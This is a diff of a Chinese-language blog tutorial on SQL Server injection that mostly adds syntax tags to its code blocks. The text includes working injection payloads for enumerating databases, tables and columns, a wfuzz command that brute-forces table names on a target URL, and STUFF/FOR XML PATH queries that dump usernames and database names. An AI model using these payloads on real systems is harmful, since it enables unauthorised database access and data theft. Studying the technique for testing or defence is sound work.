@@ -18,13 +18,13 @@ SQL Server注入，一般也是先找库、再找表、再查字段、最终查�
 
 1.查第一个：
 
-```
+```sql
 id=1 and (SELECT top 1 Name FROM Master..SysDatabases)>0 --
 ```
 
 2.NOT IN
 
-```
+```sql
 id=1 and (SELECT top 1 Name FROM Master..SysDatabases where name not in ('master'))>0 --
 ```
 
@@ -61,7 +61,7 @@ if __name__ == "__main__":
 
 先来分析一下语句：
 
-```
+```sql
 cid =1 and (select top 1 name from [数据库名称].sys.all_objects where type='U' AND is_ms_shipped=0 and name not in (''))>0 AND 'aNmV'='aNmV
 ```
 
@@ -76,6 +76,7 @@ cid =1 and (select top 1 name from [数据库名称].sys.all_objects where type=
 于是，又想到通过FUZZ的方式：
 
 ![2020-03-01-11-34-39](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/835850cccf61c6d461e1fa9e4bede6bc.png)
+
 
 ```
 wfuzz -c -z file,/usr/shar/sqlmap/data/common-table.txt --sc 500 "http://www.xxx/xxx?cid=1%27%20and%20%20(select%20top%201%20COLUMN_NAME%20from%20xxx.information_schema.columns%20where%20TABLE_NAME=%27Hsoft_FUZZ%27%20and%20COLUMN_NAME%20not%20in(%27x%27))%3E0%20and%20%27s%27=%27s"
@@ -94,7 +95,7 @@ wfuzz -c -z file,/usr/shar/sqlmap/data/common-table.txt --sc 500 "http://www.xxx
 
 STUFF字符串函数是将字符串插入到另一个字符串中。它会删除开始位置第一个字符串中的指定长度的字符，然后将第二个字符串插入到开始位置的第一个字符串中，语法如下。
 
-```
+```sql
 STUFF（<character_expression>，<开始>，<长度>，<character_expression>）
 <character_expression>
 ```
@@ -106,17 +107,17 @@ STUFF最常见的用途莫过于结合FOR XML PATH对返回JSON字符串的拼�
 
 如：
 
-```
+```sql
 SELECT name FROM dbo.base_pay_type WHERE is_enabled = 1
 ```
 
 类似的SQL可能会返回多行数据，因此可以通过STUFF与XML PATH集合使用：
 
 
-- 将查询到的数据转换成行，以逗号隔开，以[]包裹
+- 将查询到的数据转换成行，以逗号隔开，以`[]`包裹
 
-```
 
+```sql
 SELECT STUFF((SELECT  '[' + name + '],'  
 FROM(SELECT name FROM dbo.base_pay_type WHERE is_enabled = 1) a  FOR  XML PATH('')  ), 1,0, '') AS Name 
 ```
@@ -125,9 +126,11 @@ FROM(SELECT name FROM dbo.base_pay_type WHERE is_enabled = 1) a  FOR  XML PATH('
 
 直接套用到注入场景：
 
-```
+```sql
 SELECT STUFF((SELECT  '[' + name + '],'  FROM(SELECT name from 数据库名称.sys.all_objects where type='U' AND is_ms_shipped=0) a  FOR  XML PATH('')  ), 1,0, '')
 ```
+
+
 在sql shell中直接执行即可返回所有表名：
 
 ![2020-03-01-11-35-15](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f1db9589f0c703b6ff101490ab00b90e.png)
@@ -138,13 +141,13 @@ SELECT STUFF((SELECT  '[' + name + '],'  FROM(SELECT name from 数据库名称.s
 
 - 取得某个表10个用户名
 
-```
+```sql
 SELECT STUFF((SELECT  '[' + username + '],'  FROM(SELECT Top 10 username from 数据库名称.User ) a  FOR  XML PATH('')  ), 1,0, '')
 ```
 
 - 取得所有数据库名
 
-```
+```sql
 SELECT STUFF((SELECT  '[' + Name + '],'  FROM(SELECT  Name from Master..SysDatabases ) a  FOR  XML PATH('')  ), 1,0, '')
 ```
 
